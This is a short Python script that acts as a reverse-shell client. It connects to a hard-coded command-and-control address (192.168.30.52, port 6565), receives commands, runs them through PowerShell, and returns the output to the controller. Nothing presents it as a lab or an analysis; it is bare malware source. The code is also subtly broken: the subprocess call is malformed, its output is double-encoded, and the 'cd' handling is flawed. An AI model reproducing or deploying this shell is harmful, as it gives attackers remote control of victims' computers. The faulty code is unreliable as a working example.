import  socket
import subprocess
import os


HOST = "192.168.30.52"
PORT = 6565




CC_client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
CC_client.connect((HOST,PORT))

while 1:
    pwd = os.getcwd()
    CC_client.send(pwd.encode('utf-8'))
    response = CC_client.recv(4096)
    command = response.decode('utf-8').split()

    if command[0] == "cd":
        try:
            os.chdir(command[1])
            output = '\n'
        except FileNotFoundError as er:
            output = er
    stdout = subprocess.check_output("powershell", "-Command",command)
    if stdout:
        CC_client.send(stdout.encode('utf-8'))
    else:
        CC_client.send(b"\n")

        
CC_client.close()



